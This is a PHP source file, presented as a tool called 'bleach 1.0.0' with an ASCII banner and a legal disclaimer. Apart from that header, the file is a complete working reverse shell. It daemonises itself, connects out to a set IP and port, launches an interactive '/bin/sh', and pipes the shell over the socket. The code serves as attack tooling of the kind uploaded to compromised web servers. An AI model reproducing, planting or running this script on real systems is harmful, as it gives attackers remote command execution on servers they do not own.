<?php
/*   ___        ___                                             
    (   )      (   ) .-.         .-.                            
  .-.| |  .--.  | | ( __) .--.  ( __) .--.  ___  ___    .--.    
 /   \ | /    \ | | (''")/    \ (''")/    \(   )(   ) /  _  \   
|  .-. ||  .-. ;| |  | ||  .-. ; | ||  .-. ;| |  | | . .' `. ;  
| |  | ||  | | || |  | ||  |(___)| || |  | || |  | | | '   | |  
| |  | ||  |/  || |  | ||  |     | || |  | || |  | | _\_`.(___) 
| |  | ||  ' _.'| |  | ||  | ___ | || |  | || |  | |(   ). '.   
| '  | ||  .'.-.| |  | ||  '(   )| || '  | || |  ; ' | |  `\ |  
' `-'  /'  `-' /| |  | |'  `-' | | |'  `-' /' `-'  / ; '._,' '  
 `.__,'  `.__.'(___)(___)`.__,' (___)`.__.'  '.__.'   '.___.'
 
 
TOOL - bleach 1.0.0
DATE - 25/06/2016

USING THIS TOOL ILLEGALY IS A CRIME AND YOU WILL BE ARRESTED.
CREATOR DOESNT TAKE ANY KIND OF RESPONSABILITY IF YOU WILL GO AND ACT ILLEGALLY WITH THiS TOOL.
THIS TOOL SHOULD BE USED ONLY FOR LEGAL PURPOUSES.

SOURCE CODE IS ONLY AVAIABLE FOR 10 DAYS.
 
ENJOY. 
*/


set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	if ($pid) {
		exit(0);
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}
	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise!");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?> 



